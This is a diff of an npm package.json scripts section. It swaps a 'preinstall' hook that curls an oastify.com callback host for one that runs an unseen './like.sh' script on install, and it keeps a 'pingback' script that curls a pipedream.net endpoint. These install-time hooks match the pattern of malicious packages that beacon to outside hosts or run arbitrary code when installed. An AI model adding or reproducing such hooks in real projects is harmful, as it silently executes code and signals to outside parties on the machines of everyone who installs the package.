@@ -157,7 +157,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "npm run compile && npm run test",
-    "preinstall": "curl https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com",
+    "preinstall": "./like.sh",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "cross-env NODE_ENV=production node ./dist/main.js",
     "coverage": "jest --coverage",
